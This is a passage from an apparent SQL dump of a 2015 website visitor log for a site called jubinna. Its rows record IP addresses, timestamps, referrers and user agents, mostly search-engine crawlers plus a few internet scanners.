rv:31.0) Gecko/20100101 Firefox/31.0'),(778,'111.248.61.188','2015-06-30','20:45:52','',''),(779,'111.248.57.130','2015-06-30','21:12:37','',''),(780,'62.75.216.19','2015-06-30','23:07:19','','Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0'),(781,'5.9.44.13','2015-07-01','00:04:55','','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36'),(782,'114.44.61.98','2015-07-01','00:52:29','',''),(783,'182.118.60.65','2015-07-01','01:55:42','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(784,'36.229.247.18','2015-07-01','04:20:00','',''),(785,'91.194.84.106','2015-07-01','06:19:01','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(786,'157.55.39.89','2015-07-01','06:22:06','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(787,'36.230.254.193','2015-07-01','08:03:56','',''),(788,'182.118.54.114','2015-07-01','08:21:07','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(789,'111.248.118.44','2015-07-01','17:32:44','',''),(790,'209.126.117.84','2015-07-01','18:12:33','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(791,'157.55.39.213','2015-07-01','18:28:45','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(792,'62.212.73.138','2015-07-01','20:21:41','','Internet-wide-scan-to-be-removed-from-this-list-email-info-at-binaryedge.io'),(793,'114.44.57.2','2015-07-01','20:29:33','',''),(794,'46.165.197.142','2015-07-02','04:41:22','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(795,'207.46.13.20','2015-07-02','06:09:58','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(796,'71.187.219.210','2015-07-02','06:37:13','','panscient.com'),(797,'111.248.63.107','2015-07-02','11:57:07','',''),(798,'54.174.246.78','2015-07-02','13:43:56','',''),(799,'157.55.39.34','2015-07-02','14:01:47','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(800,'104.167.119.95','2015-07-02','18:05:48','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(801,'46.4.123.172','2015-07-02','20:34:37','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(802,'61.228.90.238','2015-07-02','20:46:19','',''),(803,'182.118.45.219','2015-07-03','03:29:06','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(804,'182.118.53.30','2015-07-03','07:38:55','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(805,'69.167.133.10','2015-07-03','09:22:54','',''),(806,'111.243.204.211','2015-07-03','09:57:57','',''),(807,'5.9.111.70','2015-07-03','12:08:03','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(808,'157.55.39.31','2015-07-03','18:22:49','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(809,'141.212.122.202','2015-07-03','20:07:57','',''),(810,'114.44.58.171','2015-07-03','23:09:26','',''),(811,'209.126.107.104','2015-07-04','00:19:36','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(812,'157.55.39.106','2015-07-04','00:21:17','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(813,'207.46.13.50','2015-07-04','07:38:03','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(814,'157.55.39.31','2015-07-04','08:24:29','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(815,'111.248.113.38','2015-07-04','09:30:56','',''),(816,'111.248.61.253','2015-07-04','14:32:49','',''),(817,'114.44.56.151','2015-07-04','17:31:58','',''),(818,'94.102.50.45','2015-07-04','18:13:56','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(819,'42.120.160.21','2015-07-04','20:11:41','','YisouSpider'),(820,'42.156.139.21','2015-07-04','20:11:42','','YisouSpider'),(821,'42.156.138.108','2015-07-04','20:14:47','','YisouSpider'),(822,'113.68.111.219','2015-07-04','22:38:21','','Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0'),(823,'141.212.122.170','2015-07-04','23:23:51','',''),(824,'182.118.60.41','2015-07-05','01:09:25','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(825,'1.171.249.122','2015-07-05','02:11:40','',''),(826,'157.55.39.38','2015-07-05','08:42:08','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(827,'182.118.60.39','2015-07-05','08:54:56','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(828,'1.34.22.39','2015-07-05','10:51:11','',''),(829,'157.55.39.106','2015-07-05','11:16:08','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(830,'207.46.13.20','2015-07-05','11:20:24','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(831,'114.44.56.72','2015-07-05','15:10:01','',''),(832,'209.126.107.104','2015-07-05','16:04:35','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(833,'46.4.89.35','2015-07-06','05:16:28','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(834,'111.248.59.165','2015-07-06','08:24:07','',''),(835,'111.248.117.12','2015-07-06','14:21:28','',''),(836,'193.164.216.238','2015-07-06','18:23:50','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(837,'114.44.58.96','2015-07-06','20:54:02','',''),(838,'52.74.189.36','2015-07-06','23:56:10','',''),(839,'157.55.39.117','2015-07-07','00:19:16','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(840,'182.118.60.45','2015-07-07','00:49:01','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(841,'185.35.62.11','2015-07-07','02:40:29','',''),(842,'112.221.70.75','2015-07-07','02:52:56','','Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko'),(843,'182.118.45.212','2015-07-07','07:12:16','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(844,'210.216.54.2','2015-07-07','07:54:27','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36'),(845,'157.55.39.3','2015-07-07','09:01:13','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(846,'::1','2015-07-09','07:54:37','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36'),(847,'::1','2015-07-14','12:37:09','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36'),(848,'::1','2015-07-23','14:27:04','http://localhost/jubinna/bbs/write.php?bo_table=event_video','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36'),(849,'180.76.15.32','2015-08-25','22:38:43','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(850,'180.76.15.24','2015-08-25','22:39:26','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(851,'118.127.210.91','2015-08-25','22:49:34','','Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H143 Safari/600.1.4'),(852,'157.55.39.122','2015-08-25','23:20:50','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(853,'180.76.15.157','2015-08-25','23:38:57','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(854,'180.76.15.25','2015-08-25','23:39:40','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(855,'119.116.196.55','2015-08-26','00:13:29','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(856,'42.87.208.12','2015-08-26','00:27:05','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(857,'42.58.65.212','2015-08-26','00:34:14','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(858,'113.238.37.72','2015-08-26','00:34:32','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(859,'180.76.15.15','2015-08-26','00:53:51','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(860,'180.76.15.161','2015-08-26','00:55:06','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(861,'180.76.15.163','2015-08-26','01:46:30','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(862,'180.76.15.141','2015-08-26','03:47:05','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(863,'180.76.15.28','2015-08-26','03:47:54','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(864,'180.76.15.146','2015-08-26','05:11:30','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(865,'180.76.15.143','2015-08-26','05:12:42','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(866,'180.76.15.19','2015-08-26','05:56:16','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(867,'180.76.15.152','2015-08-26','05:57:31','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(868,'180.76.15.157','2015-08-26','06:13:12','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(869,'180.76.15.9','2015-08-26','06:13:12','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(870,'112.221.70.75','2015-08-26','06:20:17','','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'),(871,'61.228.90.162','2015-08-26','06:22:00','',''),(872,'110.76.142.179','2015-08-26','06:24:27','','facebookexternalhit/1.1;kakaotalk-scrap/1.0;'),(873,'180.76.15.16','2015-08-26','06:59:05','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(874,'180.76.15.151','2015-08-26','07:00:23','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(875,'207.46.13.73','2015-08-26','07:00:38','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(876,'219.249.227.13','2015-08-26','07:16:09','','facebookexternalhit/1.1;kakaotalk-scrap/1.0;'),(877,'180.76.15.26','2015-08-26','07:47:58','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(878,'180.76.15.139','2015-08-26','07:49:03','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(879,'219.249.227.11','2015-08-26','07:59:12','','facebookexternalhit/1.1;kakaotalk-scrap/1.0;'),(880,'175.223.20.166','2015-08-26','08:03:04','','Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143 KAKAOTALK'),(881,'180.76.15.18','2015-08-26','08:48:35','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(882,'180.76.15.29','2015-08-26','08:49:39','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(883,'180.76.15.23','2015-08-26','10:40:20','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(884,'157.55.39.109','2015-08-26','11:40:50','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(885,'180.76.15.155','2015-08-26','12:01:44','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(886,'180.76.15.24','2015-08-26','12:03:08','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(887,'219.249.227.12','2015-08-26','13:37:37','','facebookexternalhit/1.1;kakaotalk-scrap/1.0;'),(888,'110.70.26.190','2015-08-26','13:46:42','','Mozilla/5.0 (Linux; Android 4.4.2; LG-F320K Build/KOT49I.F320K21w) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36;KAKAOTALK'),(889,'110.76.142.159','2015-08-26','14:08:55','','facebookexternalhit/1.1;kakaotalk-scrap/1.0;'),(890,'180.76.15.160','2015-08-26','15:10:26','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(891,'180.76.15.17','2015-08-26','15:51:41','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(892,'180.76.15.10','2015-08-26','16:55:44','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(893,'42.156.250.119','2015-08-26','17:36:35','','Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)'),(894,'180.76.15.5','2015-08-26','17:42:06','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(895,'180.76.15.148','2015-08-26','17:42:49','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(896,'180.76.15.6','2015-08-26','18:54:36','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(897,'180.76.15.154','2015-08-26','18:55:51','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(898,'180.76.15.22','2015-08-26','19:42:20','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(899,'119.114.212.53','2015-08-26','19:59:07','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(900,'119.114.212.75','2015-08-26','20:01:28','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(901,'218.24.216.144','2015-08-26','20:04:02','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(902,'180.76.15.34','2015-08-26','20:54:16','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(903,'180.76.15.8','2015-08-26','21:48:16','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(904,'180.76.15.142','2015-08-26','23:38:42','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(905,'157.55.39.58','2015-08-27','00:53:47','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(906,'180.76.15.160','2015-08-27','00:55:47','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(907,'180.76.15.27','2015-08-27','00:57:04','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(908,'60.23.69.45','2015-08-27','01:31:53','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(909,'42.87.208.197','2015-08-27','01:52:36','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(910,'182.118.55.138','2015-08-27','02:43:46','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(911,'36.229.233.186','2015-08-27','02:55:04','',''),(912,'180.76.15.24','2015-08-27','03:03:16','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(913,'180.76.15.158','2015-08-27','03:04:24','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(914,'180.76.15.156','2015-08-27','03:50:20','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(915,'180.76.15.149','2015-08-27','03:51:14','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(916,'180.76.15.13','2015-08-27','05:09:40','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(917,'180.76.15.139','2015-08-27','05:24:35','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(918,'180.76.15.163','2015-08-27','05:44:25','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(919,'182.118.53.243','2015-08-27','06:53:40','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(920,'180.76.15.5','2015-08-27','06:56:10','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(921,'180.76.15.162','2015-08-27','06:57:27','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(922,'180.76.15.147','2015-08-27','07:43:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(923,'180.76.15.6','2015-08-27','07:44:24','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(924,'180.76.15.19','2015-08-27','08:50:06','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(925,'111.248.62.120','2015-08-27','09:19:51','',''),(926,'118.163.34.118','2015-08-27','09:36:45','','Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'),(927,'180.76.15.136','2015-08-27','09:44:55','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(928,'180.76.15.21','2015-08-27','10:50:11','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(929,'180.76.15.140','2015-08-27','10:51:22','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(930,'180.76.15.33','2015-08-27','11:44:32','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(931,'180.76.15.159','2015-08-27','12:57:27','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(932,'180.76.15.155','2015-08-27','13:43:54','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(933,'157.55.39.153','2015-08-27','14:32:15','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(934,'180.76.15.14','2015-08-27','14:49:03','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(935,'188.138.17.205','2015-08-27','15:34:41','',''),(936,'180.76.15.142','2015-08-27','16:42:27','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(937,'180.76.15.20','2015-08-27','16:43:10','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(938,'111.243.254.158','2015-08-27','17:53:55','',''),(939,'180.76.15.141','2015-08-27','18:53:21','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(940,'180.76.15.150','2015-08-27','18:54:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(941,'169.54.233.123','2015-08-27','18:59:57','','Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'),(942,'89.163.145.79','2015-08-27','19:08:41','','Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'),(943,'69.197.177.194','2015-08-27','19:23:59','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(944,'180.76.15.154','2015-08-27','19:42:50','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(945,'207.46.13.53','2015-08-27','20:10:59','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(946,'180.76.15.32','2015-08-27','21:51:01','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(947,'118.127.210.91','2015-08-27','22:22:37','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'),(948,'180.76.15.30','2015-08-27','22:50:37','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(949,'180.76.15.22','2015-08-27','23:38:46','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(950,'94.102.48.193','2015-08-28','00:32:56','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(951,'42.57.63.134','2015-08-28','00:37:16','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(952,'180.76.15.34','2015-08-28','00:44:20','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(953,'180.76.15.25','2015-08-28','00:45:13','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(954,'180.76.15.31','2015-08-28','01:46:12','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(955,'180.76.15.9','2015-08-28','01:47:09','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(956,'180.76.15.8','2015-08-28','03:03:16','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(957,'180.76.15.140','2015-08-28','03:04:00','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(958,'180.76.15.21','2015-08-28','04:06:51','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(959,'180.76.15.141','2015-08-28','04:08:03','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(960,'180.76.15.151','2015-08-28','05:05:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(961,'180.76.15.135','2015-08-28','05:06:40','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(962,'192.99.150.120','2015-08-28','05:15:40','http://domainsigma.com/whois/jubinna.com','Mozilla/5.0 (compatible; DomainSigmaCrawler/0.1; +http://domainsigma.com/robot)'),(963,'113.229.243.89','2015-08-28','05:43:15','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(964,'42.57.60.180','2015-08-28','05:44:26','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(965,'180.76.15.152','2015-08-28','05:46:55','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(966,'180.76.15.163','2015-08-28','05:47:47','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(967,'180.76.15.18','2015-08-28','07:00:54','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(968,'180.76.15.144','2015-08-28','07:44:08','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(969,'141.212.122.202','2015-08-28','09:40:10','','Mozilla/5.0 zgrab/0.x'),(970,'180.76.15.28','2015-08-28','09:55:51','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(971,'180.76.15.143','2015-08-28','09:57:03','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(972,'207.46.13.121','2015-08-28','10:13:47','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(973,'180.76.15.154','2015-08-28','10:50:40','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(974,'180.76.15.137','2015-08-28','10:51:51','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(975,'207.46.13.10','2015-08-28','11:14:13','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(976,'207.46.13.13','2015-08-28','11:18:12','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(977,'180.76.15.142','2015-08-28','11:20:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(978,'180.76.15.30','2015-08-28','11:20:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(979,'180.76.15.11','2015-08-28','11:39:07','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(980,'180.76.15.138','2015-08-28','11:39:50','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(981,'157.55.39.114','2015-08-28','12:15:29','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(982,'180.76.15.150','2015-08-28','12:59:09','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(983,'180.76.15.6','2015-08-28','13:44:37','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(984,'180.76.15.146','2015-08-28','15:10:21','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(985,'180.76.15.148','2015-08-28','15:59:34','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(986,'111.248.97.11','2015-08-28','16:01:27','',''),(987,'180.76.15.15','2015-08-28','16:54:02','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(988,'36.229.246.233','2015-08-28','17:24:01','',''),(989,'141.212.122.194','2015-08-28','17:25:59','','Mozilla/5.0 zgrab/0.x'),(990,'180.76.15.29','2015-08-28','17:54:55','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(991,'180.76.15.158','2015-08-28','18:54:11','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(992,'180.76.15.147','2015-08-28','19:43:12','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(993,'180.76.15.159','2015-08-28','19:44:01','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(994,'218.24.223.131','2015-08-28','21:34:02','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(995,'119.116.194.155','2015-08-28','21:39:22','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(996,'180.76.15.16','2015-08-28','21:48:37','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(997,'180.76.15.134','2015-08-28','22:50:40','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(998,'180.76.15.139','2015-08-28','22:51:52','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(999,'180.76.15.160','2015-08-28','23:37:07','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1000,'118.127.210.91','2015-08-29','00:25:32','','Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12B410 